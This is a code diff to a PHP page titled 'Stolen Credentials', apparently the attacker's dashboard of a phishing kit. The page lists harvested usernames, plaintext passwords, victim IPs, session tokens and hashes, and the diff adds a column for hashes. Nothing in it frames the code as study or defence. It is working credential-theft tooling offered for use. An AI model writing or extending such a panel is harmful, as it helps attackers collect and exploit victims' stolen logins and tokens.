@@ -276,13 +276,13 @@ $result = $conn->query($sql);
 
 ?>
     <h2><FONT COLOR="#FFFFFF">Stolen Credentials</FONT></h2>
-<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH>Actions</TH></TR>
+<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH>Hash</TH><TH>Actions</TH></TR>
 <?php
     // output data of each row
     while($row = $result->fetch_assoc()) {
 //$pw = $row["pass"];
 $inputfields = "<input type=\"hidden\" name=\"project\" value=\"".$project."\"><input type=\"hidden\" name=\"timestamp\" value=\"".$row['entered']."\">";
-echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["Token"]."</td><td><form method=\"post\" action=\"".$_SERVER['PHP_SELF']."\"><input type=\"submit\" value=\"Delete\" name=\"DELETE\">".$inputfields."</td></form></tr>";
+echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["Token"]."</td><td>".$row["Hash"]."</td><td><form method=\"post\" action=\"".$_SERVER['PHP_SELF']."\"><input type=\"submit\" value=\"Delete\" name=\"DELETE\">".$inputfields."</td></form></tr>";
     }
 
 printf($conn->error);
